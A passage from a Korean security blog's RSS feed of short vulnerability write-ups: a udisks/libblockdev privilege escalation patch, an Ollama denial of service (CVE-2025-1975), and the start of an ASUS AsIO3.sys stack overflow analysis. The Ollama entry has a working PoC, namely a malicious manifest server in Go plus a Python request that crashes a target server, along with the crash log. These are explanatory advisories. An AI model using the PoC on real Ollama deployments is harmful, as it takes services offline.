&#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xBA70;, <code>udisks_daemon_handle_mount &#x2192; polkit_check &#x2192; blkdev_mount</code> &#xACBD;&#xB85C;&#xB97C; &#xB530;&#xB77C; &#xB8E8;&#xD2B8; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xB9C8;&#xC6B4;&#xD2B8; &#xC791;&#xC5C5;&#xC774; &#xC218;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>libblockdev&#xAC00; &#xC785;&#xB825;&#xC744; &#xBCC4;&#xB2E4;&#xB978; &#xAC80;&#xC99D; &#xC5C6;&#xC774;, &#xC678;&#xBD80;&#xC5D0;&#xC11C; &#xB4E4;&#xC5B4;&#xC628; &#xC694;&#xCCAD;&#xC744; &#xB8E8;&#xD2B8; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xADF8;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xD574; LPE &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Patch-Code"><a href="#Patch-Code" class="headerlink" title="Patch Code"></a>Patch Code</h3><ul><li><p>Unpatched Code</p>  <pre><code class="hljs gauss"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">caller_in_allow_active_group</span>()) {     <span class="hljs-keyword">return</span> ALLOW_MOUNT; }</code></pre><p>caller_in_allow_active_group() &#xD568;&#xC218;&#xB294; polkit&#xC758; &#xC815;&#xCC45;&#xC744; &#xD1B5;&#xD574; &#x201C;active&#x201D; &#xC0AC;&#xC6A9;&#xC790;(&#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xBB3C;&#xB9AC;&#xC801;&#xC73C;&#xB85C; &#xC2DC;&#xC2A4;&#xD15C; &#xC55E;&#xC5D0; &#xC788;&#xB294; &#xC0AC;&#xC6A9;&#xC790;)&#xC778;&#xC9C0; &#xC5EC;&#xBD80;&#xB9CC; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C; &#xD638;&#xCD9C;&#xC790;&#xAC00; &#xB8E8;&#xD2B8;&#xC778;&#xC9C0; &#xC544;&#xB2CC;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xAD8C;&#xD55C; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB3C4; &#xB8E8;&#xD2B8; &#xAD8C;&#xD55C; &#xC791;&#xC5C5;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p></li></ul><ul><li><p>Patched Code</p>  <pre><code class="hljs"><span class="hljs-attribute">Patched</span>: if (caller_in_allow_active_group() &amp;&amp; caller_uid == 0) {     return ALLOW_MOUNT; }</code></pre><p>&#xD328;&#xCE58; &#xD6C4; &#xC5D0;&#xB294; &#x201C;allow_active&#x201D; &#xC870;&#xAC74;&#xACFC; UID&#xAC00; 0(root)&#xC778; &#xACBD;&#xC6B0;&#xC5D0;&#xB9CC; &#xB514;&#xC2A4;&#xD06C; &#xB9C8;&#xC6B4;&#xD2B8;&#xB97C; &#xD5C8;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC870;&#xAC74;&#xC744; &#xD1B5;&#xD574; &#xB8E8;&#xD2B8;&#xAC00; &#xC544;&#xB2CC; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC694;&#xCCAD;&#xC744; &#xCC28;&#xB2E8;&#xD558;&#xACE0;, &#xB8E8;&#xD2B8; &#xC0AC;&#xC6A9;&#xC790;&#xB9CC;&#xC774; udisksd&#xB97C; &#xD1B5;&#xD574; &#xC791;&#xC5C5;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://ubuntu.com/blog/udisks-libblockdev-lpe-vulnerability-fixes-available">https://ubuntu.com/blog/udisks-libblockdev-lpe-vulnerability-fixes-available</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/LPE/">LPE</category>
      
      <category domain="https://hackyboiz.github.io/tags/romi0x/">romi0x</category>
      
      <category domain="https://hackyboiz.github.io/tags/Fedora/">Fedora</category>
      
      <category domain="https://hackyboiz.github.io/tags/libblockdev/">libblockdev</category>
      
      <category domain="https://hackyboiz.github.io/tags/udisks/">udisks</category>
      
      <category domain="https://hackyboiz.github.io/tags/Polkit/">Polkit</category>
      
      
      <comments>https://hackyboiz.github.io/2025/07/09/romi0x/1day1line0709/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-1975 : Ollama의 배열 인덱스 검증 미흡으로 인한 Denial of Service(DoS) 취약점</title>
      <link>https://hackyboiz.github.io/2025/07/05/j0ker/2025-07-05/</link>
      <guid>https://hackyboiz.github.io/2025/07/05/j0ker/2025-07-05/</guid>
      <pubDate>Sat, 05 Jul 2025 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://huntr.com/bounties/921ba5d4-f1d0-4c66-9764-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://huntr.com/bounties/921ba5d4-f1d0-4c66-9764-4f72dffe7acd">A malicious manifests can lead to DoS due to unchecked array bound access via network in ollama/ollama in ollama/ollama</a></li><li><a href="https://github.com/ollama/ollama/commit/9239a254e054d24b0de3358ba8c4bd9b50730bfd">Commit 9239a25</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ollama &#x2264; 0.5.11</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC11C;&#xBC84;&#xAC00; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; &#xC694;&#xCCAD;&#xC5D0; &#xC758;&#xD574; &#xBAA8;&#xB378;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xBC1B;&#xB294; pull &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">PullModel</span><span class="hljs-params">(ctx context.Context, name <span class="hljs-keyword">string</span>, regOpts *registryOptions, fn <span class="hljs-keyword">func</span>(api.ProgressResponse)</span>) <span class="hljs-title">error</span></span> {mp := ParseModelPath(name) <span class="hljs-comment">// build deleteMap to prune unused layers</span>deleteMap := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-keyword">struct</span>{})manifest, _, err := GetManifest(mp)<span class="hljs-keyword">if</span> errors.Is(err, os.ErrNotExist) {<span class="hljs-comment">// noop</span>} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {slog.Warn(<span class="hljs-string">&quot;pulling model with bad existing manifest&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>, name, <span class="hljs-string">&quot;error&quot;</span>, err)} <span class="hljs-keyword">else</span> {<span class="hljs-keyword">for</span> _, l := <span class="hljs-keyword">range</span> manifest.Layers {deleteMap[l.Digest] = <span class="hljs-keyword">struct</span>{}{}}<span class="hljs-keyword">if</span> manifest.Config.Digest != <span class="hljs-string">&quot;&quot;</span> {deleteMap[manifest.Config.Digest] = <span class="hljs-keyword">struct</span>{}{}}}<span class="hljs-keyword">if</span> mp.ProtocolScheme == <span class="hljs-string">&quot;http&quot;</span> &amp;&amp; !regOpts.Insecure {<span class="hljs-keyword">return</span> errInsecureProtocol}fn(api.ProgressResponse{Status: <span class="hljs-string">&quot;pulling manifest&quot;</span>})manifest, err = pullModelManifest(ctx, mp, regOpts)<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;pull model manifest: %s&quot;</span>, err)}<span class="hljs-keyword">var</span> layers []Layerlayers = <span class="hljs-built_in">append</span>(layers, manifest.Layers...)<span class="hljs-keyword">if</span> manifest.Config.Digest != <span class="hljs-string">&quot;&quot;</span> {layers = <span class="hljs-built_in">append</span>(layers, manifest.Config)}skipVerify := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-keyword">bool</span>)<span class="hljs-keyword">for</span> _, layer := <span class="hljs-keyword">range</span> layers {cacheHit, err := downloadBlob(ctx, downloadOpts{mp:      mp,digest:  layer.Digest,regOpts: regOpts,fn:      fn,})<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<span class="hljs-keyword">return</span> err}skipVerify[layer.Digest] = cacheHit<span class="hljs-built_in">delete</span>(deleteMap, layer.Digest)}</code></pre><p>&#xBAA8;&#xB378;&#xC744; &#xB2E4;&#xC6B4; &#xBC1B;&#xC744; &#xB54C; &#xBAA8;&#xB378;&#xC774; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xBAA8;&#xB378;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB97C; manifest&#xB97C; &#xD1B5;&#xD574; &#xBC1B;&#xC544;&#xC624;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; manifest &#xC548;&#xC5D0; layer &#xC815;&#xBCF4;&#xAC00; &#xC788;&#xACE0; &#xADF8; &#xC548;&#xC5D0; digest &#xC815;&#xBCF4;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; downloadBlob &#xD568;&#xC218;&#xB97C; &#xD2B8;&#xB9AC;&#xAC70; &#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs go"><span class="hljs-comment">// downloadBlob downloads a blob from the registry and stores it in the blobs directory</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">downloadBlob</span><span class="hljs-params">(ctx context.Context, opts downloadOpts)</span> <span class="hljs-params">(cacheHit <span class="hljs-keyword">bool</span>, _ error)</span></span> {fp, err := GetBlobsPath(opts.digest)<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, err}fi, err := os.Stat(fp)<span class="hljs-keyword">switch</span> {<span class="hljs-keyword">case</span> errors.Is(err, os.ErrNotExist):<span class="hljs-keyword">case</span> err != <span class="hljs-literal">nil</span>:<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, err<span class="hljs-keyword">default</span>:opts.fn(api.ProgressResponse{Status:    fmt.Sprintf(<span class="hljs-string">&quot;pulling %s&quot;</span>, opts.digest[<span class="hljs-number">7</span>:<span class="hljs-number">19</span>]), <span class="hljs-comment">// [1]</span>Digest:    opts.digest,Total:     fi.Size(),Completed: fi.Size(),})<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>, <span class="hljs-literal">nil</span>}</code></pre><p>&#xBAA8;&#xB378;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBAA8;&#xB378; &#xC815;&#xBCF4;&#xB97C; &#xCC98;&#xB9AC;&#xD560; &#xB54C; digest&#xC758; &#xAE38;&#xC774;&#xAC00; 0&#xC77C; &#xACBD;&#xC6B0;, [1]&#xC5D0;&#xC11C; disgest&#xB97C; &#xD30C;&#xC2F1;&#xD560; &#xB54C; DoS&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; PoC &#xC11C;&#xBC84;&#xB97C; &#xAD6C;&#xD604;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs go"><span class="hljs-comment">// server.go</span><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {    gin.SetMode(gin.DebugMode)    r := gin.Default()    r.GET(<span class="hljs-string">&quot;/v2/zznq/code1/manifests/latest&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> {        c.JSON(<span class="hljs-number">200</span>, gin.H{            <span class="hljs-string">&quot;schemaVersion&quot;</span>: <span class="hljs-number">2</span>,            <span class="hljs-string">&quot;mediaType&quot;</span>:     <span class="hljs-string">&quot;application/vnd.docker.distribution.manifest.v2+json&quot;</span>,            <span class="hljs-string">&quot;config&quot;</span>: gin.H{                <span class="hljs-string">&quot;mediaType&quot;</span>: <span class="hljs-string">&quot;application/vnd.docker.container.image.v1+json&quot;</span>,                <span class="hljs-string">&quot;digest&quot;</span>:    <span class="hljs-string">&quot;&quot;</span>,                <span class="hljs-string">&quot;size&quot;</span>:      <span class="hljs-number">10</span>},            <span class="hljs-string">&quot;layers&quot;</span>: []any{                gin.H{                    <span class="hljs-string">&quot;mediaType&quot;</span>: <span class="hljs-string">&quot;application/vnd.ollama.image.license&quot;</span>,                    <span class="hljs-string">&quot;digest&quot;</span>:    <span class="hljs-string">&quot;&quot;</span>,                    <span class="hljs-string">&quot;size&quot;</span>:      <span class="hljs-number">10</span>},            },        })    })    r.Run(<span class="hljs-string">&quot;localhost:8080&quot;</span>)}</code></pre><p>&#xC704;&#xC640; &#xAC19;&#xC774; &#xC11C;&#xBC84;&#xB97C; &#xC2E4;&#xD589;&#xD55C; &#xB4A4;, &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xBA74; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs go"><span class="hljs-keyword">import</span> requestsrequests.post(<span class="hljs-string">&quot;http://{target_ollama_sever}:11434/api/pull&quot;</span>, json={<span class="hljs-string">&quot;model&quot;</span>: <span class="hljs-string">&quot;http://{malicious_server}:8080/zznq/code1&quot;</span>, <span class="hljs-string">&quot;insecure&quot;</span>: True})</code></pre><ul><li>Crash log:</li></ul><pre><code class="hljs go"><span class="hljs-number">2025</span>/<span class="hljs-number">02</span>/<span class="hljs-number">15</span> <span class="hljs-number">00</span>:<span class="hljs-number">08</span>:<span class="hljs-number">25</span> routes.<span class="hljs-keyword">go</span>:<span class="hljs-number">1186</span>: INFO server config env=<span class="hljs-string">&quot;map[HTTPS_PROXY: HTTP_PROXY: NO_PROXY: OLLAMA_DEBUG:false OLLAMA_FLASH_ATTENTION:false OLLAMA_GPU_OVERHEAD:0 OLLAMA_HOST:http://127.0.0.1:11434 OLLAMA_KEEP_ALIVE:5m0s OLLAMA_KV_CACHE_TYPE: OLLAMA_LLM_LIBRARY: OLLAMA_LOAD_TIMEOUT:5m0s OLLAMA_MAX_LOADED_MODELS:0 OLLAMA_MAX_QUEUE:512 OLLAMA_MODELS:/Users/whoami/.ollama/models OLLAMA_MULTIUSER_CACHE:false OLLAMA_NOHISTORY:false OLLAMA_NOPRUNE:false OLLAMA_NUM_PARALLEL:0 OLLAMA_ORIGINS:[http://localhost https://localhost http://localhost:* https://localhost:* http://127.0.0.1 https://127.0.0.1 http://127.0.0.1:* https://127.0.0.1:* http://0.0.0.0 https://0.0.0.0 http://0.0.0.0:* https://0.0.0.0:* app://* file://* tauri://* vscode-webview://*] OLLAMA_SCHED_SPREAD:false http_proxy: https_proxy: no_proxy:]&quot;</span>time=<span class="hljs-number">2025</span><span class="hljs-number">-02</span><span class="hljs-number">-15</span>T00:<span class="hljs-number">08</span>:<span class="hljs-number">25.225</span><span class="hljs-number">-08</span>:<span class="hljs-number">00</span> level=INFO source=images.<span class="hljs-keyword">go</span>:<span class="hljs-number">432</span> msg=<span class="hljs-string">&quot;total blobs: 0&quot;</span>time=<span class="hljs-number">2025</span><span class="hljs-number">-02</span><span class="hljs-number">-15</span>T00:<span class="hljs-number">08</span>:<span class="hljs-number">25.225</span><span class="hljs-number">-08</span>:<span class="hljs-number">00</span> level=INFO source=images.<span class="hljs-keyword">go</span>:<span class="hljs-number">439</span> msg=<span class="hljs-string">&quot;total unused blobs removed: 0&quot;</span>time=<span class="hljs-number">2025</span><span class="hljs-number">-02</span><span class="hljs-number">-15</span>T00:<span class="hljs-number">08</span>:<span class="hljs-number">25.225</span><span class="hljs-number">-08</span>:<span class="hljs-number">00</span> level=INFO source=routes.<span class="hljs-keyword">go</span>:<span class="hljs-number">1237</span> msg=<span class="hljs-string">&quot;Listening on 127.0.0.1:11434 (version 0.5.11)&quot;</span>time=<span class="hljs-number">2025</span><span class="hljs-number">-02</span><span class="hljs-number">-15</span>T00:<span class="hljs-number">08</span>:<span class="hljs-number">25.244</span><span class="hljs-number">-08</span>:<span class="hljs-number">00</span> level=INFO source=types.<span class="hljs-keyword">go</span>:<span class="hljs-number">130</span> msg=<span class="hljs-string">&quot;inference compute&quot;</span> id=<span class="hljs-number">0</span> library=metal variant=<span class="hljs-string">&quot;&quot;</span> compute=<span class="hljs-string">&quot;&quot;</span> driver=<span class="hljs-number">0.0</span> name=<span class="hljs-string">&quot;&quot;</span> total=<span class="hljs-string">&quot;10.7 GiB&quot;</span> available=<span class="hljs-string">&quot;10.7 GiB&quot;</span><span class="hljs-built_in">panic</span>: runtime error: slice bounds out of <span class="hljs-keyword">range</span> [:<span class="hljs-number">19</span>] with length <span class="hljs-number">0</span>goroutine <span class="hljs-number">12</span> [running]:github.com/ollama/ollama/server.downloadBlob({<span class="hljs-number">0x101739c40</span>, <span class="hljs-number">0x1400052c640</span>}, {{{<span class="hljs-number">0x10133fc9a</span>, <span class="hljs-number">0x5</span>}, {<span class="hljs-number">0x14000419c80</span>, <span class="hljs-number">0xe</span>}, {<span class="hljs-number">0x14000419c8f</span>, <span class="hljs-number">0x4</span>}, {<span class="hljs-number">0x14000419c94</span>, <span class="hljs-number">0x5</span>}, ...}, ...})    /Users/runner/work/ollama/ollama/server/download.<span class="hljs-keyword">go</span>:<span class="hljs-number">478</span> +<span class="hljs-number">0x508</span>github.com/ollama/ollama/server.PullModel({<span class="hljs-number">0x101739c40</span>, <span class="hljs-number">0x1400052c640</span>}, {<span class="hljs-number">0x14000419c80</span>, <span class="hljs-number">0x20</span>}, <span class="hljs-number">0x1400052ac00</span>, <span class="hljs-number">0x14000502450</span>)    /Users/runner/work/ollama/ollama/server/images.<span class="hljs-keyword">go</span>:<span class="hljs-number">564</span> +<span class="hljs-number">0x600</span>github.com/ollama/ollama/server.(*Server).PullHandler.func1()    /Users/runner/work/ollama/ollama/server/routes.<span class="hljs-keyword">go</span>:<span class="hljs-number">593</span> +<span class="hljs-number">0x174</span>created by github.com/ollama/ollama/server.(*Server).PullHandler in goroutine <span class="hljs-number">10</span>    /Users/runner/work/ollama/ollama/server/routes.<span class="hljs-keyword">go</span>:<span class="hljs-number">580</span> +<span class="hljs-number">0x528</span></code></pre><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD328;&#xCE58;&#xB294; digest&#xAC00; &#xBE48;&#xBB38;&#xC790;&#xC5F4;&#xC778;&#xC9C0; &#xC5EC;&#xBD80;&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xB3C4;&#xB85D; &#xC218;&#xC815;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/dos/">dos</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/ollama/">ollama</category>
      
      <category domain="https://hackyboiz.github.io/tags/Improper-Validation-of-Array-Index/">Improper Validation of Array Index</category>
      
      <category domain="https://hackyboiz.github.io/tags/go/">go</category>
      
      
      <comments>https://hackyboiz.github.io/2025/07/05/j0ker/2025-07-05/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-1533: ASUS AsIO3.sys의 Stack Overflow 취약점</title>
      <link>https://hackyboiz.github.io/2025/07/02/ogu123/cve-2025-1533/</link>
      <guid>https://hackyboiz.github.io/2025/07/02/ogu123/cve-2025-1533/</guid>
      <pubDate>Wed, 02 Jul 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.talosintelligence.com/vulnerability_rep</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://www.talosintelligence.com/vulnerability_reports/TALOS-2025-2144">https://www.talosintelligence.com/vulnerability_reports/TALOS-2025-2144</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Asus Armoury Crate 5.9.13.0</li><li>AI suite 3 ver 1.0.0.0</li><li>AsIO3 Driver 1.02.30</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-1533&#xC740; AsIO3.sys &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C; Asusgio3 &#xC7A5;&#xCE58; &#xD578;&#xB4E4;&#xC744; &#xC5BB;&#xC73C;&#xB824;&#xACE0; &#xD560; &#xB54C; Stack Overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; Asusgio3 &#xC7A5;&#xCE58; &#xD578;&#xB4E4;&#xC744; &#xC5BB;&#xAE30; &#xC704;&#xD574; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xC544;&#xB798; &#xB450; &#xAC00;&#xC9C0; &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>SHA-256 &#xD574;&#xC2DC; &#xAC80;&#xC99D;</li><li>&#xD504;&#xB85C;&#xC138;&#xC2A4; ID(PID) allowed list &#xD655;&#xC778;</li></ol><pre><code class="hljs angelscript"><span class="hljs-built_in">bool</span> sub_140002EF4() <span class="hljs-comment">// Is AsusCertService.exe trying to obtain a handle ?</span>{[...]  <span class="hljs-keyword">if</span> ( pZwQueryInformationProcess( (HANDLE)<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>LL, ProcessImageFileNameWin32, <span class="hljs-number">0</span>LL, <span class="hljs-number">0</span>, (PULONG)NumberOfBytes) == <span class="hljs-number">0xC0000004</span> )  {win32ImagePath = (_UNICODE_STRING *)ExAllocatePoolWithTag(PagedPool, *(unsigned <span class="hljs-built_in">int</span> *)NumberOfBytes, <span class="hljs-string">&apos;pPR&apos;</span>);<span class="hljs-keyword">if</span> ( win32ImagePath ){  memset(PoolWithTag, <span class="hljs-number">0</span>, *(unsigned <span class="hljs-built_in">int</span> *)NumberOfBytes);  pZwQueryInformationProcess((HANDLE)<span class="hljs-number">-1</span>LL,ProcessImageFileNameWin32,win32ImagePath,*(unsigned <span class="hljs-built_in">int</span> *)NumberOfBytes,<span class="hljs-number">0</span>LL);  <span class="hljs-keyword">if</span> ( (<span class="hljs-built_in">int</span>)Win32PathToNtPath(win32ImagePath, &amp;ntImagePath) &gt;= <span class="hljs-number">0</span> )  {fileContent = GetFileContent(&amp;ntImagePath, &amp;fileSize);<span class="hljs-keyword">if</span> ( fileContent ){  blockSize = <span class="hljs-number">64</span>LL;  v12 = <span class="hljs-number">64</span>LL;  _fileSize = fileSize;  v14 = fileSize;  ptrFileContent = (char *)fileContent;  v13 = (char *)fileContent;  Z_SHA256_Init((SHA256_CTX *)sha_ctx);  <span class="hljs-keyword">if</span> ( _fileSize &lt; <span class="hljs-number">64</span> )blockSize = _fileSize;  v12 = blockSize;  <span class="hljs-keyword">while</span> ( _fileSize &gt; <span class="hljs-number">0</span> )  {<span class="hljs-keyword">if</span> ( _fileSize - blockSize &lt; <span class="hljs-number">0</span> )  blockSize = _fileSize;v12 = blockSize;Util::AES_Block_encrypt(sha_ctx, ptrFileContent, blockSize);ptrFileContent += blockSize;v13 = ptrFileContent;_fileSize -= blockSize;v14 = _fileSize;  }  SHA_Final(sha_ctx, calculatedSHA256);  result = memcmp(calculatedSHA256, &amp;g_sha256Hash, <span class="hljs-number">0x20</span>uLL) == <span class="hljs-number">0</span>; <span class="hljs-comment">// [1]</span>  ExFreePoolWithTag(fileContent, <span class="hljs-number">0x705052</span>u);}  }  RtlFreeUnicodeString(&amp;ntImagePath);  ExFreePoolWithTag(win32ImagePath, <span class="hljs-number">0</span>);}  }  <span class="hljs-keyword">return</span> result;}</code></pre><p>&#xC704; <code>sub_140002EF4()</code> &#xD568;&#xC218;&#xB294; SHA-256 &#xD574;&#xC2DC; &#xAC80;&#xC99D;&#xC744; &#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB85C; &#xC544;&#xB798; &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD504;&#xB85C;&#xC138;&#xC2A4; &#xACBD;&#xB85C; &#xD655;&#xC778; </li><li>&#xD30C;&#xC77C; &#xB0B4;&#xC6A9; &#xC77D;&#xAE30;</li><li>SHA-256 &#xD574;&#xC2DC; &#xACC4;&#xC0B0;</li><li>g_sha256Hash &#xD574;&#xC2DC; &#xAC12;&#xACFC; &#xBE44;&#xAD50;</li></ol><p>&#xB530;&#xB77C;&#xC11C; g_sha256Hash &#xD574;&#xC2DC; &#xAC12;&#xACFC; &#xB2E4;&#xB974;&#xBA74; Asusgio3 &#xD578;&#xB4E4;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC5C6;&#xB294;&#xB370; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>Win32PathToNtPath()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xACBD;&#xB85C;&#xB97C; &#xCC98;&#xB9AC;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs reasonml">__int64 __fastcall <span class="hljs-constructor">Win32PathToNtPath(<span class="hljs-params">_UNICODE_STRING</span> <span class="hljs-operator">*</span><span class="hljs-params">win32ImagePath</span>, <span class="hljs-params">struct</span> <span class="hljs-params">_UNICODE_STRING</span> <span class="hljs-operator">*</span><span class="hljs-params">outNtImagePath</span>)</span>{<span class="hljs-literal">[<span class="hljs-operator">...</span>]</span>  WCHAR ntImagePath<span class="hljs-literal">[<span class="hljs-number">255</span>]</span>; <span class="hljs-comment">// [rsp+D0h] [rbp-30h] BYREF</span>  backslashPos = <span class="hljs-number">0</span>;  memset(partition, <span class="hljs-number">0</span>, sizeof(partition));  inBuffer = win32ImagePath-&gt;Buffer; <span class="hljs-comment">// e.g: C:\AAAAAAAAA......\AAAAAAAAAAA....\TestApp.exe</span>  wcscpy(partition, L<span class="hljs-string">&quot;\\??\\&quot;</span>);      <span class="hljs-comment">// [2]</span>  v6 = *inBuffer;  <span class="hljs-keyword">if</span> ( *inBuffer != <span class="hljs-character">&apos;\\&apos;</span> )  {    i = <span class="hljs-number">0L</span>L;    <span class="hljs-keyword">do</span>    {      <span class="hljs-keyword">if</span> ( !v6 )        break;      ++i;      ++backslashPos;      v6 = inBuffer<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>;    }    <span class="hljs-keyword">while</span> ( v6 != <span class="hljs-character">&apos;\\&apos;</span> );  }    memmove(&amp;partition<span class="hljs-literal">[<span class="hljs-number">4</span>]</span>, inBuffer, backslashPos<span class="hljs-operator"> * </span><span class="hljs-number">2</span>);  <span class="hljs-constructor">RtlInitUnicodeString(&amp;DestinationString, <span class="hljs-params">partition</span>)</span>;  ObjectAttributes.Length = <span class="hljs-number">48</span>;  ObjectAttributes.ObjectName = &amp;DestinationString;  ObjectAttributes.RootDirectory = <span class="hljs-number">0L</span>L;  ObjectAttributes.Attributes = <span class="hljs-number">64</span>;  ObjectAttributes.SecurityDescriptor = <span class="hljs-number">0L</span>L;    status = <span class="hljs-constructor">ZwOpenSymbolicLinkObject(&amp;LinkHandle, 0x80000000, &amp;ObjectAttributes)</span>;  <span 